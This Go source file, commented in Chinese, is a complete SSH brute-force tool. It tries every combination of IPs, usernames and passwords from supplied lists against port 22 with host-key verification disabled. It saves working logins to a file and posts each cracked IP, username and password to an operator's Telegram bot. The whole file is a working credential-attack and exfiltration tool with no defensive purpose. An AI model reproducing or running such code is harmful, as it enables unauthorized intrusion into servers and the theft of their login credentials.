package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	telegramBotToken string
	telegramChatID   string
)

func main() {
	if len(os.Args) != 7 {
		fmt.Println("用法: ./程序 ip.txt user.txt pass.txt 最大线程数 BotToken ChatID")
		return
	}

	ipFile := os.Args[1]
	userFile := os.Args[2]
	passFile := os.Args[3]
	threadLimit := parseInt(os.Args[4], 10)
	telegramBotToken = os.Args[5]
	telegramChatID = os.Args[6]

	// 禁用 SSH agent
	os.Unsetenv("SSH_AUTH_SOCK")
	os.Unsetenv("SSH_AGENT_PID")

	ips := readLines(ipFile)
	users := readLines(userFile)
	passwords := readLines(passFile)

	sem := make(chan struct{}, threadLimit)
	var wg sync.WaitGroup
	var fileMu sync.Mutex

	for _, ip := range ips {
		for _, user := range users {
			for _, pass := range passwords {
				ip, user, pass := ip, user, pass
				sem <- struct{}{}
				wg.Add(1)
				go func() {
					defer wg.Done()
					defer func() { <-sem }()
					if trySSH(ip, user, pass) {
						fileMu.Lock()
						line := fmt.Sprintf("%s %s %s", ip, user, pass)
						appendLine("success.txt", line)
						sendTelegramMessage(fmt.Sprintf("✅ 成功登录:\nIP: %s\n用户: %s\n密码: %s", ip, user, pass))
						fileMu.Unlock()
						fmt.Printf("[✅ 成功] %s\n", line)
					} else {
						fmt.Printf("[❌ 失败] %s@%s %s\n", user, ip, pass)
					}
				}()
			}
		}
	}

	wg.Wait()
	fmt.Println("🎉 所有尝试完成。")
}

func trySSH(ip, username, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	conn, err := ssh.Dial("tcp", ip+":22", config)
	if err != nil {
		fmt.Printf("❌ SSH Dial 失败 [%s %s %s]: %v\n", ip, username, password, err)
		return false
	}
	defer conn.Close()

	session, err := conn.NewSession()
	if err != nil {
		fmt.Printf("❌ 新建 SSH Session 失败 [%s %s %s]: %v\n", ip, username, password, err)
		return false
	}
	defer session.Close()

	output, err := session.Output("echo success")
	if err != nil {
		fmt.Printf("❌ 执行命令失败 [%s %s %s]: %v\n", ip, username, password, err)
		return false
	}

	if strings.TrimSpace(string(output)) == "success" {
		return true
	} else {
		fmt.Printf("⚠️ 登录成功但输出非预期 [%s %s %s]: %s\n", ip, username, password, string(output))
		return false
	}
}

func sendTelegramMessage(message string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
	body := fmt.Sprintf("chat_id=%s&text=%s", telegramChatID, message)

	req, err := http.NewRequest("POST", url, bytes.NewBufferString(body))
	if err != nil {
		fmt.Printf("❌ 创建请求失败: %v\n", err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("❌ 推送 Telegram 失败: %v\n", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("❌ Telegram 返回非200状态: %s\n", resp.Status)
		respBody, _ := io.ReadAll(resp.Body)
		fmt.Printf("🔍 返回内容: %s\n", string(respBody))
	} else {
		// 可选：调试成功推送
		// fmt.Println("✅ Telegram 推送成功")
		io.Copy(io.Discard, resp.Body)
	}
}

func readLines(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("❌ 打开文件失败: %s\n", filename)
		os.Exit(1)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		t := strings.TrimSpace(scanner.Text())
		if t != "" {
			lines = append(lines, t)
		}
	}
	return lines
}

func appendLine(filename, line string) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("❌ 写入文件失败: %s\n", filename)
		return
	}
	defer f.Close()
	f.WriteString(line + "\n")
}

func parseInt(s string, fallback int) int {
	var val int
	_, err := fmt.Sscanf(s, "%d", &val)
	if err != nil {
		return fallback
	}
	return val
}
